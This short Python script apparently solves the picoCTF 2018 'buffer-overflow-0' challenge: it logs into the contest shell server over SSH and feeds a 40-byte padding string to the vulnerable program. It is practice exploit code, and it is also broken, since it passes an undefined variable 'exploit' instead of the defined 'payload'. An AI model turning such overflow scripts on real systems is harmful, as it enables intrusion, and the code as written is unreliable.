#!/usr/bin/python

from pwn import * 

s = ssh('jon03306@2018shell1.picoctf.com')

payload  = "A" * 40

py = s.run('cd /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d; ./vuln {}'.format(exploit))
print py.recv()
s.close()
